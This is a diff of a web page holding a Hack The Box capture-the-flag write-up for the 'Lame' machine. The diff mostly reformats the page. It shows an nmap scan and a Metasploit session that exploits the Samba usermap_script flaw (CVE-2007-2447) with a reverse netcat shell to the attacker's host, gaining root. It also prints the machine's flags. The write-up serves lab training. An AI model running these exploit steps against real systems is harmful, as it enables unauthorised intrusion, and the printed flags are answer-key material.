@@ -6,7 +6,7 @@
     <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">    
 <meta name="viewport" content="width=device-width,minimum-scale=1">
-<meta name="description" content="Port Scan 🔗&#34;Nmap 7.94SVN scan initiated Sat Aug 10 08:35:19 2024 as: nmap -sC -sV -A -T4 -Pn -o scan 10.10.10.3 Nmap scan report for 10.10.10.3 Host is up (0.15s latency). Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.14.185 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | vsFTPd 2.">
+<meta name="description" content="Port Scan 🔗Nmap 7.94SVN scan initiated Sat Aug 10 08:35:19 2024 as: nmap -sC -sV -A -T4 -Pn -o scan 10.10.10.3 Nmap scan report for 10.10.10.3 Host is up (0.15s latency). Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.14.185 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | vsFTPd 2.">
 <meta name="generator" content="Hugo 0.92.2" />
 
 
@@ -55,7 +55,7 @@
           ·
         </span>
         <span>
-          804 words
+          687 words
         </span>
         <span class="split">
           ·
@@ -73,13 +73,13 @@
       <p><p class="markdown-image">
   <img src="attachment/43ebccb6774d75bacfaa80b40cc8e5ce.png" alt=""  />
 </p></p>
-<h3 id="port-scan">Port Scan <a href="#port-scan" class="anchor">🔗</a></h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&#34;Nmap 7.94SVN scan initiated Sat Aug 10 08:35:19 2024 as: nmap -sC -sV -A -T4 -Pn -o scan 10.10.10.3
-Nmap scan report for 10.10.10.3
-Host is up (0.15s latency).
-Not shown: 996 filtered tcp ports (no-response)
+<h3 id="port-scan">Port Scan <a href="#port-scan" class="anchor">🔗</a></h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">Nmap 7.94SVN scan initiated Sat Aug <span style="color:#ae81ff">10</span> 08:35:19 <span style="color:#ae81ff">2024</span> as: nmap -sC -sV -A -T4 -Pn -o scan 10.10.10.3
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.3
+Host is up <span style="color:#f92672">(</span>0.15s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">996</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
 PORT    STATE SERVICE     VERSION
 21/tcp  open  ftp         vsftpd 2.3.4
-|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
 | ftp-syst:
 |   STAT:
 | FTP server status:
@@ -87,165 +87,98 @@ PORT    STATE SERVICE     VERSION
 |      Logged in as ftp
 |      TYPE: ASCII
 |      No session bandwidth limit
-|      Session timeout in seconds is 300
+|      Session timeout in seconds is <span style="color:#ae81ff">300</span>
 |      Control connection is plain text
 |      Data connections will be plain text
 |      vsFTPd 2.3.4 - secure, fast, stable
 |_End of status
-22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
 | ssh-hostkey:
-|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
-|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
-139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+|   <span style="color:#ae81ff">1024</span> 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd <span style="color:#f92672">(</span>DSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">2048</span> 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
- ```
-Anonymous connection FTP but nothing there
-
-# CVE-2007-2447
-
-Looking online i found this vulnerability for this version of 
-
-
-```text
-┌──(kali㉿kali)-[~/HTB/Lame]
+</code></pre></div><p>Anonymous connection FTP but nothing there</p>
+<h3 id="cve-2007-2447">CVE-2007-2447 <a href="#cve-2007-2447" class="anchor">🔗</a></h3><p>Looking online i found this vulnerability for this version of smb</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Lame<span style="color:#f92672">]</span>
 └─$ msfconsole                                                                      
-Metasploit tip: Use the resource command to run commands from a file
-                                                  
-     ,           ,
-    /             \                                                                                                                 
-   ((__---,,,---__))                                                                                                                
-      (_) O O (_)_________                                                                                                          
-         \ _ /            |\                                                                                                        
-          o_o \   M S F   | \                                                                                                       
-               \   _____  |  *                                                                                                      
-                |||   WW|||                                                                                                         
-                |||     |||                                                                                                         
-                                                                                                                                    
-
-       =[ metasploit v6.4.18-dev                          ]
-+ -- --=[ 2420 exploits - 1248 auxiliary - 423 post       ]
-+ -- --=[ 1465 payloads - 47 encoders - 11 nops           ]
-+ -- --=[ 9 evasion                                       ]
-
-Metasploit Documentation: https://docs.metasploit.com/
-
 msf6 &gt; search smb 3.0.20
-[-] No results from search
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No results from search
 msf6 &gt; smb 3.0.20
-[-] Unknown command: smb. Run the help command for more details.                                                                                                 
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Unknown command: smb. Run the help command <span style="color:#66d9ef">for</span> more details.                                                                                                 
 msf6 &gt; search samba 3.0                                                                                                                                          
                                                                                                                                                                  
 Matching Modules                                                                                                                                                 
-================                                                                                                                                                 
-                                                                                                                                                                 
-   #   Name                                                   Disclosure Date  Rank       Check  Description                                                     
+<span style="color:#f92672">================</span>                                                                                                                                                                                                                                                                                                 
+   <span style="color:#75715e">#   Name                                                   Disclosure Date  Rank       Check  Description                                                     </span>
    -   ----                                                   ---------------  ----       -----  -----------
-   0   exploit/multi/samba/usermap_script                     2007-05-14       excellent  No     Samba &#34;username map script&#34; Command Execution
-   1   exploit/linux/samba/chain_reply                        2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)
-   2     \_ target: Linux (Debian5 3.2.5-4lenny6)             .                .          .      .
-   3     \_ target: Debugging Target                          .                .          .      .
-   4   exploit/linux/samba/lsa_transnames_heap                2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow
-   5     \_ target: Linux vsyscall                            .                .          .      .
-   6     \_ target: Linux Heap Brute Force (Debian/Ubuntu)    .                .          .      .
-   7     \_ target: Linux Heap Brute Force (Gentoo)           .                .          .      .
-   8     \_ target: Linux Heap Brute Force (Mandriva)         .                .          .      .
-   9     \_ target: Linux Heap Brute Force (RHEL/CentOS)      .                .          .      .
-   10    \_ target: Linux Heap Brute Force (SUSE)             .                .          .      .
-   11    \_ target: Linux Heap Brute Force (Slackware)        .                .          .      .
-   12    \_ target: Linux Heap Brute Force (OpenWRT MIPS)     .                .          .      .
-   13    \_ target: DEBUG                                     .                .          .      .
-   14  exploit/osx/samba/lsa_transnames_heap                  2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
-   15    \_ target: Automatic                                 .                .          .      .
-   16    \_ target: Mac OS X 10.4.x x86 Samba 3.0.10          .                .          .      .
-   17    \_ target: Mac OS X 10.4.x PPC Samba 3.0.10          .                .          .      .
-   18    \_ target: DEBUG                                     .                .          .      .
-   19  exploit/solaris/samba/lsa_transnames_heap              2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
-   20    \_ target: Solaris 8/9/10 x86 Samba 3.0.21-3.0.24    .                .          .      .
-   21    \_ target: Solaris 8/9/10 SPARC Samba 3.0.21-3.0.24  .                .          .      .
-   22    \_ target: DEBUG                                     .                .          .      .
+   <span style="color:#ae81ff">0</span>   exploit/multi/samba/usermap_script                     2007-05-14       excellent  No     Samba <span style="color:#e6db74">&#34;username map script&#34;</span> Command Execution
+   <span style="color:#ae81ff">1</span>   exploit/linux/samba/chain_reply                        2010-06-16       good       No     Samba chain_reply Memory Corruption <span style="color:#f92672">(</span>Linux x86<span style="color:#f92672">)</span>
+   <span style="color:#ae81ff">2</span>     <span style="color:#ae81ff">\_</span> target: Linux <span style="color:#f92672">(</span>Debian5 3.2.5-4lenny6<span style="color:#f92672">)</span>             .                .          .      .
+   <span style="color:#ae81ff">3</span>     <span style="color:#ae81ff">\_</span> target: Debugging Target                          .                .          .      .
+   <span style="color:#ae81ff">4</span>   exploit/linux/samba/lsa_transnames_heap                2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow
+   <span style="color:#ae81ff">5</span>     <span style="color:#ae81ff">\_</span> target: Linux vsyscall                            .                .          .      .
+   <span style="color:#ae81ff">6</span>     <span style="color:#ae81ff">\_</span> target: Linux Heap Brute Force <span style="color:#f92672">(</span>Debian/Ubuntu<span style="color:#f92672">)</span>    .                .          .      .
+   <span style="color:#ae81ff">7</span>     <span style="color:#ae81ff">\_</span> target: Linux Heap Brute Force <span style="color:#f92672">(</span>Gentoo<span style="color:#f92672">)</span>           .                .          .      .
+   <span style="color:#ae81ff">8</span>     <span style="color:#ae81ff">\_</span> target: Linux Heap Brute Force <span style="color:#f92672">(</span>Mandriva<span style="color:#f92672">)</span>         .                .          .      .
+   <span style="color:#ae81ff">9</span>     <span style="color:#ae81ff">\_</span> target: Linux Heap Brute Force <span style="color:#f92672">(</span>RHEL/CentOS<span style="color:#f92672">)</span>      .                .          .      .
+   <span style="color:#ae81ff">10</span>    <span style="color:#ae81ff">\_</span> target: Linux Heap Brute Force <span style="color:#f92672">(</span>SUSE<span style="color:#f92672">)</span>             .                .          .      .
+   <span style="color:#ae81ff">11</span>    <span style="color:#ae81ff">\_</span> target: Linux Heap Brute Force <span style="color:#f92672">(</span>Slackware<span style="color:#f92672">)</span>        .                .          .      .
+   <span style="color:#ae81ff">12</span>    <span style="color:#ae81ff">\_</span> target: Linux Heap Brute Force <span style="color:#f92672">(</span>OpenWRT MIPS<span style="color:#f92672">)</span>     .                .          .      .
+   <span style="color:#ae81ff">13</span>    <span style="color:#ae81ff">\_</span> target: DEBUG                                     .                .          .      .
+   <span style="color:#ae81ff">14</span>  exploit/osx/samba/lsa_transnames_heap                  2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
+   <span style="color:#ae81ff">15</span>    <span style="color:#ae81ff">\_</span> target: Automatic                                 .                .          .      .
+   <span style="color:#ae81ff">16</span>    <span style="color:#ae81ff">\_</span> target: Mac OS X 10.4.x x86 Samba 3.0.10          .                .          .      .
+   <span style="color:#ae81ff">17</span>    <span style="color:#ae81ff">\_</span> target: Mac OS X 10.4.x PPC Samba 3.0.10          .                .          .      .
+   <span style="color:#ae81ff">18</span>    <span style="color:#ae81ff">\_</span> target: DEBUG                                     .                .          .      .
+   <span style="color:#ae81ff">19</span>  exploit/solaris/samba/lsa_transnames_heap              2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
+   <span style="color:#ae81ff">20</span>    <span style="color:#ae81ff">\_</span> target: Solaris 8/9/10 x86 Samba 3.0.21-3.0.24    .                .          .      .
+   <span style="color:#ae81ff">21</span>    <span style="color:#ae81ff">\_</span> target: Solaris 8/9/10 SPARC Samba 3.0.21-3.0.24  .                .          .      .
+   <span style="color:#ae81ff">22</span>    <span style="color:#ae81ff">\_</span> target: DEBUG                                     .                .          .      .
 
-
-Interact with a module by name or index. For example info 22, use 22 or use exploit/solaris/samba/lsa_transnames_heap
-After interacting with a module you can manually set a TARGET with set TARGET &#39;DEBUG&#39;
-
+Interact with a module by name or index. For example info 22, use <span style="color:#ae81ff">22</span> or use exploit/solaris/samba/lsa_transnames_heap
+After interacting with a module you can manually set a TARGET with set TARGET <span style="color:#e6db74">&#39;DEBUG&#39;</span>
 msf6 &gt; use exploit/multi/samba/usermap_script 
-[*] No payload configured, defaulting to cmd/unix/reverse_netcat
-msf6 exploit(multi/samba/usermap_script) &gt; show options
-
-Module options (exploit/multi/samba/usermap_script):
-
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> No payload configured, defaulting to cmd/unix/reverse_netcat
+msf6 exploit<span style="color:#f92672">(</span>multi/samba/usermap_script<span style="color:#f92672">)</span> &gt; show options
+Module options <span style="color:#f92672">(</span>exploit/multi/samba/usermap_script<span style="color:#f92672">)</span>:
    Name     Current Setting  Required  Description
    ----     ---------------  --------  -----------
    CHOST                     no        The local client address
    CPORT                     no        The local client port
-   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
-   RPORT    139              yes       The target port (TCP)
-
-
-Payload options (cmd/unix/reverse_netcat):
+   Proxies                   no        A proxy chain of format type:host:port<span style="color:#f92672">[</span>,type:host:port<span style="color:#f92672">][</span>...<span style="color:#f92672">]</span>
+   RHOSTS                    yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT    <span style="color:#ae81ff">139</span>              yes       The target port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
+Payload options <span style="color:#f92672">(</span>cmd/unix/reverse_netcat<span style="color:#f92672">)</span>:
 
    Name   Current Setting  Required  Description
    ----   ---------------  --------  -----------
-   LHOST  192.168.163.129  yes       The listen address (an interface may be specified)
-   LPORT  4444             yes       The listen port
+   LHOST  192.168.163.129  yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
+   LPORT  <span style="color:#ae81ff">4444</span>             yes       The listen port
 
 
 Exploit target:
 
    Id  Name
    --  ----
-   0   Automatic
-
-
-
-View the full module info with the info, or info -d command.
-
-msf6 exploit(multi/samba/usermap_script) &gt; set LHOST 10.10.14.185
-LHOST =&gt; 10.10.14.185
-msf6 exploit(multi/samba/usermap_script) &gt; set LPORT 9091
-LPORT =&gt; 9091
-msf6 exploit(multi/samba/usermap_script) &gt; exploit
-
-[-] Msf::OptionValidateError One or more options failed to validate: RHOSTS.
-msf6 exploit(multi/samba/usermap_script) &gt; set RHOST 10.10.10.3
-RHOST =&gt; 10.10.10.3
-msf6 exploit(multi/samba/usermap_script) &gt; set RPORT 139
-RPORT =&gt; 139
-msf6 exploit(multi/samba/usermap_script) &gt; exploit
-
-[*] Started reverse TCP handler on 10.10.14.185:9091 
-[*] Command shell session 1 opened (10.10.14.185:9091 -&gt; 10.10.10.3:47888) at 2024-08-10 09:35:50 -0400
+   <span style="color:#ae81ff">0</span>   Automatic
+msf6 exploit<span style="color:#f92672">(</span>multi/samba/usermap_script<span style="color:#f92672">)</span> &gt; set LHOST 10.10.14.185
+LHOST <span style="color:#f92672">=</span>&gt; 10.10.14.185
+msf6 exploit<span style="color:#f92672">(</span>multi/samba/usermap_script<span style="color:#f92672">)</span> &gt; set LPORT <span style="color:#ae81ff">9091</span>
+LPORT <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">9091</span>
+msf6 exploit<span style="color:#f92672">(</span>multi/samba/usermap_script<span style="color:#f92672">)</span> &gt; exploit
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Msf::OptionValidateError One or more options failed to validate: RHOSTS.
+msf6 exploit<span style="color:#f92672">(</span>multi/samba/usermap_script<span style="color:#f92672">)</span> &gt; set RHOST 10.10.10.3
+RHOST <span style="color:#f92672">=</span>&gt; 10.10.10.3
+msf6 exploit<span style="color:#f92672">(</span>multi/samba/usermap_script<span style="color:#f92672">)</span> &gt; set RPORT <span style="color:#ae81ff">139</span>
+RPORT <span style="color:#f92672">=</span>&gt; <span style="color:#ae81ff">139</span>
+msf6 exploit<span style="color:#f92672">(</span>multi/samba/usermap_script<span style="color:#f92672">)</span> &gt; exploit
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.10.14.185:9091 
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Command shell session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.10.14.185:9091 -&gt; 10.10.10.3:47888<span style="color:#f92672">)</span> at 2024-08-10 09:35:50 -0400
 
 whoami
 root
-ls
-bin
-boot
-cdrom
-dev
-etc
-home
-initrd
-initrd.img
-initrd.img.old
-lib
-lost+found
-media
-mnt
-nohup.out
-opt
-proc
-root
-sbin
-srv
-sys
-tmp
-usr
-var
-vmlinuz
-vmlinuz.old
 cd /root
 ls
 Desktop
@@ -259,8 +192,7 @@ cat root.txt
 </p><p class="markdown-image">
   <img src="attachment/e0218db999901f943bf934f889d0edec.png" alt=""  />
 </p></p>
-<h3 id="flags">Flags <a href="#flags" class="anchor">🔗</a></h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">
-root:6118f8816315bd33ecac622d179c65af
+<h3 id="flags">Flags <a href="#flags" class="anchor">🔗</a></h3><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root:6118f8816315bd33ecac622d179c65af
 user:15fd56e82fdefb166bfb1631b6c6360a
 
 </code></pre></div>
